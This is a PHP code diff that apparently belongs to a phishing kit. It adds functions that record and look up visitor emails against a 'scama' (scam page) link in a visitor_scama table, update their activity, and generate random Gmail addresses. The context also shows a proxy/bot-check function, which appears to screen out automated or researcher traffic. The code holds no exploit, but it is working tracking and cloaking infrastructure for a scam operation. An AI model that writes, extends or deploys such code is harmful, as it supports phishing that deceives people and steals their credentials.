@@ -111,3 +111,75 @@ function ipbot()
     $result_array = \proxycheck\proxycheck::check(get_client_ip(), $proxycheck_options);
     return $result_array;
 }
+
+function  Insert_scama($linkscama, $emailVisitor)
+{
+    global $conn;
+    $ip = get_client_ip();
+    $sql = "INSERT INTO visitor_scama (link_scama,email_visitor,	created_at,last_activity) VALUES (:link_scama,:email_visitor,NOW(),NOW())";
+    $stmt = $conn->prepare($sql);
+    $stmt->bindParam(':link_scama', $linkscama);
+    $stmt->bindParam(':email_visitor', $emailVisitor);
+    $stmt->execute();
+    $stmt->closeCursor();
+    return $conn->lastInsertId();
+}
+
+function compare_scama($email)
+{
+    global $conn;
+    $sql = "SELECT * FROM visitor_scama WHERE email_visitor = :email_visitor";
+    $stmt = $conn->prepare($sql);
+    $stmt->bindParam(':email_visitor', $email);
+    $stmt->execute();
+    $stmt->setFetchMode(PDO::FETCH_ASSOC);
+    $result = $stmt->fetchAll();
+    $stmt->closeCursor();
+    if (count($result) > 0) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function result_scama($email)
+{
+    global $conn;
+    $sql = "SELECT * FROM visitor_scama WHERE email_visitor = :email_visitor";
+    $stmt = $conn->prepare($sql);
+    $stmt->bindParam(':email_visitor', $email);
+    $stmt->execute();
+    $stmt->setFetchMode(PDO::FETCH_ASSOC);
+    $result = $stmt->fetchAll();
+    $stmt->closeCursor();
+    return $result;
+}
+
+function updateActivity($id)
+{
+    global $conn;
+    $sql = "UPDATE visitor_scama SET last_activity = NOW() WHERE id_visitor_scama = :id_visitor_scama";
+    $stmt = $conn->prepare($sql);
+    $stmt->bindParam(':id_visitor_scama', $id);
+    $stmt->execute();
+    $stmt->closeCursor();
+    return $conn->lastInsertId();
+}
+
+function generateRandomGmail()
+{
+    $username = generateRandomString(10); // Ganti 10 dengan panjang username yang diinginkan
+    $domain = 'gmail.com';
+    $email = $username . '@' . $domain;
+    return $email;
+}
+
+function generateRandomString($length)
+{
+    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $string = '';
+    for ($i = 0; $i < $length; $i++) {
+        $string .= $characters[rand(0, strlen($characters) - 1)];
+    }
+    return $string;
+}
